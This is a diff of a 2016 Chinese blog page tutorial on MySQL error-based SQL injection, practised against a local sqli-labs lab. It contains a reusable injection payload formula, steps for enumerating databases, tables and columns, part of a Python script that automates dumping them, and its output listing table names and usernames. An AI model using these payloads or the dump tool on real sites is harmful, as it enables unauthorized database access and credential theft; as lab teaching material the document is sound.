@@ -1,159 +1,162 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
 <head>
-    <meta charset="utf-8">
-    
-    <title>sql注入报错注入 | liuqi</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-        <meta name="keywords" content="" />
-    
-    <meta name="description" content="利用方式count()、rand()、group by三者缺一不可报错注入用一个公式，只要套用公式即可，公式如下:?id=2’ and (select 1 from (select count(),concat( floor(rand(0)2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from info">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql注入报错注入">
-<meta property="og:url" content="http://yoursite.com/2016/07/06/sql注入报错注入/index.html">
-<meta property="og:site_name" content="liuqi">
-<meta property="og:description" content="利用方式count()、rand()、group by三者缺一不可报错注入用一个公式，只要套用公式即可，公式如下:?id=2’ and (select 1 from (select count(),concat( floor(rand(0)2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from info">
-<meta property="og:image" content="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/1.png?raw=true">
-<meta property="og:updated_time" content="2016-07-07T00:33:17.324Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql注入报错注入">
-<meta name="twitter:description" content="利用方式count()、rand()、group by三者缺一不可报错注入用一个公式，只要套用公式即可，公式如下:?id=2’ and (select 1 from (select count(),concat( floor(rand(0)2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from info">
-<meta name="twitter:image" content="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/1.png?raw=true">
-    
+  <meta charset="utf-8">
+  <meta name="theme-color" content="#1b7aca">
+  <link rel="icon" href="/icon.jpg">
+  <meta name="application-name" content="liuqi"/>
+  <meta name="msapplication-TileColor" content="#1b7aca"/>
+  <meta name="msapplication-square70x70logo" content="/icon.jpg" />
+  <meta name="msapplication-square150x150logo" content="/icon.jpg" />
+  <meta name="msapplication-wide310x150logo" content="/icon.jpg" />
+  <meta name="msapplication-square310x310logo" content="/icon.jpg" />
+  <meta name="msapplication-notification" content="frequency=30; polling-uri=/atom.xml" />
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="apple-touch-icon" href="/icon.jpg">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <link rel="apple-touch-startup-image" href="/icon.jpg">
 
-    
-        <link rel="alternate" href="/" title="liuqi" type="application/atom+xml" />
-    
+  
+  <title>sql注入报错注入 | liuqi</title>
+  
+  
+  <meta name="description" content="吃吃睡睡、、、">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    
+  <meta property="og:title" content="sql注入报错注入"/>
+  <meta property="og:site_name" content="liuqi"/>
 
-    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/vendor/titillium-web/styles.css">
-    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+  
+    <meta property="og:image" content="undefined"/>
+  
 
-    <link rel="stylesheet" href="/css/style.css">
-
-    <script src="/vendor/jquery/2.0.3/jquery.min.js"></script>
-    
-    
-        <link rel="stylesheet" href="/vendor/fancybox/jquery.fancybox.css">
-    
-    
-        <link rel="stylesheet" href="/vendor/scrollLoading/style.css">
-    
-    
-    
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  
+    <link href="/css/animate.css" rel="stylesheet">
+  
+  
+    <script src="/js/jquery-2.0.3.min.js"></script>
+  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script>
+    if (window.location.href.indexOf("yoursite.com")<0) {      location.href = location.href.replace(location.host, "yoursite.com");    }
+  </script>
 
 </head>
 
+
 <body>
-    <div id="wrap">
-        <header id="header">
-    <div id="header-outer" class="outer">
-        <div class="container">
-            <div class="container-inner">
-                <div id="header-title">
-                    <h1 class="logo-wrap">
-                        <a href="/" class="logo"></a>
-                    </h1>
-                    
-                </div>
-                <div id="header-inner" class="nav-container">
-                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
-                    <div class="nav-container-inner">
-                        <ul id="main-nav">
-                            
-                                <li class="main-nav-list-item" >
-                                    <a class="main-nav-list-link" href="/">Inici</a>
-                                </li>
-                            
-                                        
-                                    
-                                <li class="main-nav-list-item" >
-                                    <a class="main-nav-list-link" href="/about/index.html">Quant a</a>
-                                </li>
-                            
-                        </ul>
-                        <nav id="sub-nav">
-                            <div id="search-form-wrap">
-
-    <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="Cercar" />
-        <button type="submit" class="search-form-submit"></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." />
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
+<!--[if lt IE9]>
 <script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: 'Posts',
-            PAGES: 'Pages',
-            CATEGORIES: 'categories',
-            TAGS: 'etiquetes',
-            UNTITLED: '(Untitled)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '/content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
+alert("Please Update Your IE \n请升级您的IE浏览器");
 </script>
-<script src="/js/insight.js"></script>
-
+< ![endif]-->
+  <header id="header" class="header header--fixed hide-from-print animated slideInDown"><div class="alignleft backtohome">
+  <a href="/">
+    <img id="icon-photo-small" class="personal-photo  animated rotateIn" src="/icon.jpg" alt="">
+  </a>
+  <h1 id="title-mini" class=""><a href="/">liuqi</a></h1>
 </div>
-                        </nav>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+<a target="_blank" id="mini-toggle" class="more icon alignright"></a>
+<nav id="main-nav" class="alignright animated slideInRight">
+
+    
+    
+      <a target="_blank" class="icon twitter" href="http://twitter.com/1ittlecup"></a>
+    
+    
+    
+      <a target="_blank" class="icon googleplus" href="http://plus.google.com/+RuoxinHe"></a> 
+    
+    
+    
+    
+    
+    
+      <a target="_blank" class="icon zhihu" href="http://zhihu.com/people/1ittlecup"></a>
+    
+    
+    
+  <div class="clearfix"></div>
+</nav>
+
 </header>
-        <div class="container">
-            <div class="main-body container-inner">
-                <div class="main-body-inner">
-                    <section id="main">
-                        <div class="main-body-header">
-    <h1 class="header">
+  <aside id="sidebar" class="alignleft animated slideInLeft"><div class="personal-info">
+  <figure>
     
-    Sense categoria
-    </h1>
+    <div  class="backtohome">
+      <a href="/">
+        <img id="icon-photo-normal" class="personal-photo animated rotateIn" src="/icon.jpg" alt="">
+      </a>
+    </div>
+    
+    <figcaption>
+      <h3 class=></h3>
+      <p></p>
+    </figcaption>
+  </figure>
+  <section class="social">
+    
+    
+      <a target="_blank" class="icon twitter depth" href="http://twitter.com/1ittlecup"></a>
+    
+    
+    
+      <a target="_blank" class="icon googleplus depth" href="http://plus.google.com/+RuoxinHe"></a> 
+    
+    
+    
+    
+    
+    
+      <a target="_blank" class="icon zhihu depth" href="http://zhihu.com/people/1ittlecup"></a>
+    
+    
+    
+  </section>
 </div>
-                        <div class="main-body-content">
-                            <article id="post-sql注入报错注入" class="article article-single article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-            <header class="article-header">
-                
+<div class="theme-info">
+  <a target="_blank" href="https://github.com/heruoxin/hexo-persona-color" class="html5"> Persona Color Theme</a> 
+  &copy; 2016 liuqi
+  
+</div>
+</aside>
+  <div id="content" class="inner">
+    <p id="header-fix"></p>
+    <div id="main-col" class="alignright"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
     
-        <h1 class="article-title" itemprop="name">
-        sql注入报错注入
-        </h1>
+      <img src="">
     
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon depth"></div>
+        <time class="depth" datetime="2016-07-06T13:22:27.000Z"><a href="#">2016-07-06</a></time>
+      
+      
+  
+    <h1 class="depth title">sql注入报错注入</h1>
+  
 
-            </header>
-        
-        
-            <div class="article-subtitle">
-                <a href="/2016/07/06/sql注入报错注入/" class="article-date">
-    <time datetime="2016-07-06T13:22:27.000Z" itemprop="datePublished">2016-07-06</time>
-</a>
-                
-            </div>
-        
-        <div class="article-entry" itemprop="articleBody">
-            <p>利用方式<br>count()、rand()、group by三者缺一不可<br>报错注入用一个公式，只要套用公式即可，公式如下:<br>?id=2’ and (select 1 from (select count(),concat( floor(rand(0)<em>2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )–+<br>公式解析<br>Floor()是取整数<br>Rand()在0和1之间产生一个随机数<br>Rand(rand()</em>2)将取到0和2的随机数<br>Floor(rand(0)<em>2)记录需为3条以上，且3条以上必报错，返回的值是有规律的<br>Count(</em>)用来统计结果的，相当于刷新一次结果<br>Group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在<br>的话count(<em>)加1，在使用group by时floor(rand(0)</em>2)会被执行一次，不存在记录，洗标会再执行一次<br>1.猜测闭合字符<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/1.png?raw=true" alt="image"><br>多了一个单引号所有闭合字符为单引号</p>
+    </header>
+    <div class="entry depth">
+      
+        <p>利用方式<br>count()、rand()、group by三者缺一不可<br>报错注入用一个公式，只要套用公式即可，公式如下:<br>?id=2’ and (select 1 from (select count(),concat( floor(rand(0)<em>2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )–+<br>公式解析<br>Floor()是取整数<br>Rand()在0和1之间产生一个随机数<br>Rand(rand()</em>2)将取到0和2的随机数<br>Floor(rand(0)<em>2)记录需为3条以上，且3条以上必报错，返回的值是有规律的<br>Count(</em>)用来统计结果的，相当于刷新一次结果<br>Group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在<br>的话count(<em>)加1，在使用group by时floor(rand(0)</em>2)会被执行一次，不存在记录，洗标会再执行一次<br>1.猜测闭合字符<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/1.png?raw=true" alt="image"><br>多了一个单引号所有闭合字符为单引号</p>
 <p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/2.png?raw=true" alt="image"><br>猜测列数<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/3.png?raw=true" alt="image"><br>尝试得到显示位<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/4.png?raw=true" alt="image"><br>报错得到数据库个数<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/5.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/6.png?raw=true" alt="image"><br>报错得到数据库的表名<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/7.png?raw=true" alt="image"><br>报错得到数据库的列的数量<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/8.png?raw=true" alt="image"><br>报错得到数据库的列名<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/9.png?raw=true" alt="image"><br>得到列的值<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/10.png?raw=true" alt="image"></p>
 <p>附上报错注入的代码</p>
 <p>#coding=utf-8</p>
@@ -199,369 +202,115 @@ print &quot;-------------&quot;
 <p>def main():<br>    if sys.argv[1] == ‘–dbs’:<br>        getAllDatabases(sys.argv[2])<br>    elif sys.argv[1] == ‘–tab’:<br>        getAlltables(sys.argv[2],sys.argv[3])<br>    elif sys.argv[1] == ‘–col’:<br>        getAllcolumns(sys.argv[2],sys.argv[3],sys.argv[4])<br>    elif sys.argv[1] == ‘–dump’:<br>        getAllcontents(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])<br>    else:<br>        print (‘What…’)</p>
 <p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
 <h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–dbs-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–dbs-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –dbs http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –dbs <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1"><a href="#aster-Less-5-id-1" class="headerlink" title="aster/Less-5/?id=1"></a>aster/Less-5/?id=1</h1><h1 id="databases-23"><a href="#databases-23" class="headerlink" title="databases:23"></a>databases:23</h1><h1 id="————"><a href="#————" class="headerlink" title="————-"></a>————-</h1><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="|  information_schema  |"></a>|  information_schema  |</h1><h1 id="bbs"><a href="#bbs" class="headerlink" title="|  bbs  |"></a>|  bbs  |</h1><h1 id="book"><a href="#book" class="headerlink" title="|  book  |"></a>|  book  |</h1><h1 id="challenges"><a href="#challenges" class="headerlink" title="|  challenges  |"></a>|  challenges  |</h1><h1 id="dvwa"><a href="#dvwa" class="headerlink" title="|  dvwa  |"></a>|  dvwa  |</h1><h1 id="dvwaa"><a href="#dvwaa" class="headerlink" title="|  dvwaa  |"></a>|  dvwaa  |</h1><h1 id="guestbook"><a href="#guestbook" class="headerlink" title="|  guestbook  |"></a>|  guestbook  |</h1><h1 id="hack"><a href="#hack" class="headerlink" title="|  hack  |"></a>|  hack  |</h1><h1 id="kppw26"><a href="#kppw26" class="headerlink" title="|  kppw26  |"></a>|  kppw26  |</h1><h1 id="lol"><a href="#lol" class="headerlink" title="|  lol  |"></a>|  lol  |</h1><h1 id="mysql"><a href="#mysql" class="headerlink" title="|  mysql  |"></a>|  mysql  |</h1><h1 id="paimai"><a href="#paimai" class="headerlink" title="|  paimai  |"></a>|  paimai  |</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–tab-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–tab-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –tab http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –tab <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1-book"><a href="#aster-Less-5-id-1-book" class="headerlink" title="aster/Less-5/?id=1 book"></a>aster/Less-5/?id=1 book</h1><h1 id="Databases-book-Table-2"><a href="#Databases-book-Table-2" class="headerlink" title="Databases:book  Table: 2"></a>Databases:book  Table: 2</h1><h1 id="Table"><a href="#Table" class="headerlink" title="Table:"></a>Table:</h1><h1 id="————-1"><a href="#————-1" class="headerlink" title="————-"></a>————-</h1><h1 id="content"><a href="#content" class="headerlink" title="|  content  |"></a>|  content  |</h1><h1 id="user"><a href="#user" class="headerlink" title="|  user  |"></a>|  user  |</h1><h1 id="————-2"><a href="#————-2" class="headerlink" title="————-"></a>————-</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–col-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–col-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –col http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –col <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1-book-user"><a href="#aster-Less-5-id-1-book-user" class="headerlink" title="aster/Less-5/?id=1 book user"></a>aster/Less-5/?id=1 book user</h1><h1 id="Databases-book-Table-user-Columns-3"><a href="#Databases-book-Table-user-Columns-3" class="headerlink" title="Databases:book  Table: user  Columns:3"></a>Databases:book  Table: user  Columns:3</h1><h1 id="Columns"><a href="#Columns" class="headerlink" title="Columns:"></a>Columns:</h1><h1 id="————-3"><a href="#————-3" class="headerlink" title="————-"></a>————-</h1><h1 id="id"><a href="#id" class="headerlink" title="|  id  |"></a>|  id  |</h1><h1 id="username"><a href="#username" class="headerlink" title="|  username  |"></a>|  username  |</h1><h1 id="password"><a href="#password" class="headerlink" title="|  password  |"></a>|  password  |</h1><h1 id="————-4"><a href="#————-4" class="headerlink" title="————-"></a>————-</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–dump-http-127-0-0-1-sqli-labs"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–dump-http-127-0-0-1-sqli-labs" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –dump http://127.0.0.1/sqli-labs-"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –dump <a href="http://127.0.0.1/sqli-labs-" target="_blank" rel="external">http://127.0.0.1/sqli-labs-</a></h1><h1 id="master-Less-5-id-1-book-user-username"><a href="#master-Less-5-id-1-book-user-username" class="headerlink" title="master/Less-5/?id=1 book user username"></a>master/Less-5/?id=1 book user username</h1><h1 id="Databases-book-Table-user-Columns-7"><a href="#Databases-book-Table-user-Columns-7" class="headerlink" title="Databases:book  Table: user  Columns:7"></a>Databases:book  Table: user  Columns:7</h1><h1 id="Columns-1"><a href="#Columns-1" class="headerlink" title="Columns:"></a>Columns:</h1><h1 id="————-5"><a href="#————-5" class="headerlink" title="————-"></a>————-</h1><h1 id="ttttt"><a href="#ttttt" class="headerlink" title="|  ttttt  |"></a>|  ttttt  |</h1><h1 id="ccccc"><a href="#ccccc" class="headerlink" title="|  ccccc  |"></a>|  ccccc  |</h1><h1 id="ddddd"><a href="#ddddd" class="headerlink" title="|  ddddd  |"></a>|  ddddd  |</h1><h1 id="xiaohong"><a href="#xiaohong" class="headerlink" title="|  xiaohong  |"></a>|  xiaohong  |</h1><h1 id="xiao"><a href="#xiao" class="headerlink" title="|  xiao  |"></a>|  xiao  |</h1><h1 id="xiaohong-1"><a href="#xiaohong-1" class="headerlink" title="|  xiaohong  |"></a>|  xiaohong  |</h1><h1 id="xiaoxiao"><a href="#xiaoxiao" class="headerlink" title="|  xiaoxiao  |"></a>|  xiaoxiao  |</h1><h1 id="————-6"><a href="#————-6" class="headerlink" title="————-"></a>————-</h1>
-        </div>
-        <footer class="article-footer">
-            
-
-
-
-    <a data-url="http://yoursite.com/2016/07/06/sql注入报错注入/" data-id="ciqud1nsr0008kghrp0jjez8v" class="article-share-link"><i class="fa fa-share"></i>Compartir</a>
-<script>
-    (function ($) {
-        $('body').on('click', function() {
-            $('.article-share-box.on').removeClass('on');
-        }).on('click', '.article-share-link', function(e) {
-            e.stopPropagation();
-
-            var $this = $(this),
-                url = $this.attr('data-url'),
-                encodedUrl = encodeURIComponent(url),
-                id = 'article-share-box-' + $this.attr('data-id'),
-                offset = $this.offset(),
-                box;
-
-            if ($('#' + id).length) {
-                box = $('#' + id);
-
-                if (box.hasClass('on')){
-                    box.removeClass('on');
-                    return;
-                }
-            } else {
-                var html = [
-                    '<div id="' + id + '" class="article-share-box">',
-                        '<input class="article-share-input" value="' + url + '">',
-                        '<div class="article-share-links">',
-                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
-                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
-                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
-                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
-                        '</div>',
-                    '</div>'
-                ].join('');
-
-              box = $(html);
-
-              $('body').append(box);
-            }
-
-            $('.article-share-box.on').hide();
-
-            box.css({
-                top: offset.top + 25,
-                left: offset.left
-            }).addClass('on');
-
-        }).on('click', '.article-share-box', function (e) {
-            e.stopPropagation();
-        }).on('click', '.article-share-box-input', function () {
-            $(this).select();
-        }).on('click', '.article-share-box-link', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-
-            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
-        });
-    })(jQuery);
-</script>
-
-        </footer>
+      
     </div>
+    <footer>
+      
+        
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
 </article>
 
-    <section id="comments">
-    
-        
-    <div id="disqus_thread">
-        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    </div>
-
-    
-    </section>
-
-                        </div>
-                    </section>
-                    <aside id="sidebar">
-    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
-    <div class="sidebar-top">
-        <p>seguir:</p>
-        <ul class="social-links">
-            
-                
-                <li>
-                    <a class="social-tooltip" title="twitter" href="/" target="_blank">
-                        <i class="icon fa fa-twitter"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="facebook" href="/" target="_blank">
-                        <i class="icon fa fa-facebook"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="google-plus" href="/" target="_blank">
-                        <i class="icon fa fa-google-plus"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="github" href="http://chuntiandechun.github.io" target="_blank">
-                        <i class="icon fa fa-github"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="weibo" href="/" target="_blank">
-                        <i class="icon fa fa-weibo"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="rss" href="/" target="_blank">
-                        <i class="icon fa fa-rss"></i>
-                    </a>
-                </li>
-                
-            
-        </ul>
-    </div>
-    
-        
-<nav id="article-nav">
-    
-        <a href="/2016/07/07/sql注入之盲注/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">més nou</strong>
-        <p class="article-nav-title">
-        
-            sql注入之盲注
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
-    
-    
-        <a href="/2016/07/06/sql注入联合查询/" id="article-nav-older" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">antic</strong>
-        <p class="article-nav-title">sql注入联合查询</p>
-        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
-        </a>
-    
-</nav>
-
-    
-    <div class="widgets-container">
-        
-            
-                
-    <div class="widget-wrap">
-        <h3 class="widget-title">recents</h3>
-        <div class="widget">
-            <ul id="recent-post" class="">
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/07/20/hello-world/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/07/20/hello-world/" class="title">Hello World</a></p>
-                            <p class="item-date"><time datetime="2016-07-20T03:57:01.950Z" itemprop="datePublished">2016-07-20</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/07/18/google-hacking/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/07/18/google-hacking/" class="title">google hacking</a></p>
-                            <p class="item-date"><time datetime="2016-07-18T12:07:37.000Z" itemprop="datePublished">2016-07-18</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/07/16/centos配置nginx-php/" class="thumbnail">
-    
-    
-        <span style="background-image:url(https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/%E5%9B%BE%E7%89%871.png?raw=true)" alt="centos配置nginx+php" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/07/16/centos配置nginx-php/" class="title">centos配置nginx+php</a></p>
-                            <p class="item-date"><time datetime="2016-07-16T11:32:08.000Z" itemprop="datePublished">2016-07-16</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/07/15/csrf漏洞发掘和利用/" class="thumbnail">
-    
-    
-        <span style="background-image:url(https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/5/%E5%9B%BE%E7%89%871.png?raw=true)" alt="csrf漏洞发掘和利用" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/07/15/csrf漏洞发掘和利用/" class="title">csrf漏洞发掘和利用</a></p>
-                            <p class="item-date"><time datetime="2016-07-15T11:12:51.000Z" itemprop="datePublished">2016-07-15</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/07/13/sql注入步骤/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/07/13/sql注入步骤/" class="title">sql注入步骤</a></p>
-                            <p class="item-date"><time datetime="2016-07-13T02:28:00.000Z" itemprop="datePublished">2016-07-13</time></p>
-                        </div>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-
-            
-                
-
-            
-                
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">arxius</h3>
-        <div class="widget">
-            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a><span class="archive-list-count">2</span></li></ul>
-        </div>
-    </div>
 
 
-            
-                
+</div></div>
+    <div class="clearfix"></div>
+  </div>
 
-            
-                
+  <footer id="footer" class="inner"></footer>
+  <script src="/js/headroom.min.and.gallery.js"></script>
+<script>
+$("#mini-toggle").click(function () {
+    $( "#main-nav" ).css("display","inline");
+    setTimeout(function(){
+        $( "#main-nav" ).removeClass("slideInRight").addClass("slideOutRight");
+    }, 3000);
+    setTimeout(function(){
+        $( "#main-nav" ).css("display","");
+        $( "#main-nav" ).removeClass("slideOutRight").addClass("slideInRight");
+    }, 3555);
+});
+</script>
 
-            
-                
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">links</h3>
-        <div class="widget">
-            <ul>
-                
-                    <li>
-                        <a href="http://www.dlam.ml">Liuqi</a>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
+<script>
+$("#header").headroom({
+  "tolerance": 0,
+  "offset": 200,
+  "classes": {
+    "initial": "",
+    "pinned": "slideInDown",
+    "unpinned": "slideOutUp"
+  }
+});
+$("#header").headroom("destroy");
+console.log("这网站没彩蛋，不用找了……")
+</script>
+
+<script>
+$("a").click(function () {
+    $( "#icon-photo-small"  ).removeClass( "rotateIn" ).addClass( "rotateOut" );
+    $( "#icon-photo-normal" ).removeClass( "rotateIn" ).addClass( "rotateOut" );
+    setTimeout(function(){
+        $( "#icon-photo-small"  ).removeClass( "rotateOut" ).addClass( "rotateIn" );
+        $( "#icon-photo-normal" ).removeClass( "rotateOut" ).addClass( "rotateIn" );
+    }, 900);
+});
+</script>
 
 
-            
-        
-    </div>
-</aside>
-                </div>
-            </div>
-        </div>
-        <footer id="footer">
-    <div class="container">
-        <div class="container-inner">
-            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
-            <div class="credit">
-                <h1 class="logo-wrap">
-                    <a href="/" class="logo"></a>
-                </h1>
-                <p>&copy; 2016 liuqi</p>
-                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
-            </div>
-        </div>
-    </div>
-</footer>
-        
-    
-    <script>
-    var disqus_shortname = 'hexo-theme-hueman';
-    
-    
-    var disqus_url = 'http://yoursite.com/2016/07/06/sql注入报错注入/';
-    
-    (function() {
-    var dsq = document.createElement('script');
-    dsq.type = 'text/javascript';
-    dsq.async = true;
-    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-    </script>
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-46393541-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
